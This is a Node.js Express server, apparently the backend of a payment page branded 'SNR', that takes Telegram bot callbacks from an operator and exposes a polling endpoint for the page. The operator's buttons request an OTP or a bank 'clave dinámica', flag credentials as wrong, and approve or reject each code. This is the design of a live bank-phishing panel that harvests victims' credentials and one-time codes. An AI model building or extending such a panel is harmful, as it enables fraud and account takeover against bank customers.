import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ Error: Variables de entorno no configuradas');
  console.error('   Agrega TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID a .env');
  process.exit(1);
}

app.use(cors());
app.use(express.json());

// ============================================
// ALMACENAMIENTO EN MEMORIA (estado de pagos)
// ============================================
const estadoPagos = new Map();

// Limpiar estados después de 10 minutos
setInterval(() => {
  const ahora = Date.now();
  for (const [key, value] of estadoPagos.entries()) {
    if (ahora - value.timestamp > 10 * 60 * 1000) {
      estadoPagos.delete(key);
      console.log(`🗑️  Limpiado estado: ${key}`);
    }
  }
}, 60 * 1000);

// ============================================
// SERVIR ARCHIVOS ESTÁTICOS
// ============================================
app.use(express.static('.'));

// ============================================
// WEBHOOK DE TELEGRAM
// ============================================
app.post('/api/webhook', (req, res) => {
  const update = req.body;

  console.log('📨 Update recibido de Telegram:', JSON.stringify(update, null, 2));

  // Si es un callback_query (botón presionado)
  if (update.callback_query) {
    const callbackData = update.callback_query.data;
    const chatId = update.callback_query.from.id;
    const messageId = update.callback_query.message.message_id;

    console.log('🔘 Callback data:', callbackData);
    console.log('👤 Chat ID:', chatId);

    // Procesar callbacks
    if (callbackData.startsWith('approve_')) {
      const solicitudId = callbackData.replace('approve_', '');
      console.log('✅ APROBADO:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'approved',
        timestamp: Date.now(),
        chatId: chatId
      });

      console.log(`✅ Estado guardado para ${solicitudId}: APPROVED`);

    } else if (callbackData.startsWith('reject_')) {
      const solicitudId = callbackData.replace('reject_', '');
      console.log('❌ RECHAZADO:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rejected',
        timestamp: Date.now(),
        chatId: chatId
      });

      console.log(`❌ Estado guardado para ${solicitudId}: REJECTED`);

    } else if (callbackData.startsWith('pedir_otp_')) {
      const solicitudId = callbackData.replace('pedir_otp_', '');
      console.log('📱 OTP solicitado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'pedir_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('pedir_clave_din_')) {
      const solicitudId = callbackData.replace('pedir_clave_din_', '');
      console.log('🔑 Clave dinámica solicitada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'pedir_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('error_credenciales_')) {
      const solicitudId = callbackData.replace('error_credenciales_', '');
      console.log('❌ Error en credenciales:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'error_credenciales',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('aprobar_otp_')) {
      const solicitudId = callbackData.replace('aprobar_otp_', '');
      console.log('✅ OTP Aprobado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'aprobar_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('rechazar_otp_')) {
      const solicitudId = callbackData.replace('rechazar_otp_', '');
      console.log('❌ OTP Rechazado:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rechazar_otp',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('aprobar_clave_din_')) {
      const solicitudId = callbackData.replace('aprobar_clave_din_', '');
      console.log('✅ Clave Dinámica Aprobada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'aprobar_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });

    } else if (callbackData.startsWith('rechazar_clave_din_')) {
      const solicitudId = callbackData.replace('rechazar_clave_din_', '');
      console.log('❌ Clave Dinámica Rechazada:', solicitudId);

      estadoPagos.set(solicitudId, {
        estado: 'rechazar_clave_din',
        timestamp: Date.now(),
        chatId: chatId
      });
    }
  }

  // Responder a Telegram
  res.json({ ok: true });
});

// ============================================
// POLLING - VERIFICAR ESTADO
// ============================================
app.get('/api/webhook', (req, res) => {
  const check = req.query.check;
  const setup = req.query.setup;

  if (setup) {
    // Setup request
    console.log('🔗 Webhook setup request');
    res.json({ success: true, message: 'Webhook ready' });
    return;
  }

  if (!check) {
    res.status(400).json({ error: 'Missing check parameter' });
    return;
  }

  const estado = estadoPagos.get(check);

  if (!estado) {
    console.log(`🔍 Verificando ${check}: pending`);
    res.json({ estado: 'pending', solicitudId: check });
    return;
  }

  console.log(`🔍 Verificando ${check}: ${estado.estado}`);
  res.json({
    estado: estado.estado,
    solicitudId: check,
    timestamp: estado.timestamp
  });
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================
// LISTAR ESTADOS (DEBUG)
// ============================================
app.get('/api/debug/estados', (req, res) => {
  const estados = {};
  for (const [key, value] of estadoPagos.entries()) {
    estados[key] = value.estado;
  }
  res.json({ total: estadoPagos.size, estados });
});

// ============================================
// INICIAR SERVIDOR
// ============================================
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════╗
║  🚀 SNR Payment Backend                ║
║  Puerto: ${PORT}                          ║
║  Webhook: http://localhost:${PORT}/api/webhook  ║
║  Status: http://localhost:${PORT}/health         ║
║  Debug: http://localhost:${PORT}/api/debug/estados  ║
╚════════════════════════════════════════╝
  `);
});

process.on('SIGINT', () => {
  console.log('\n📴 Servidor detenido');
  process.exit(0);
});
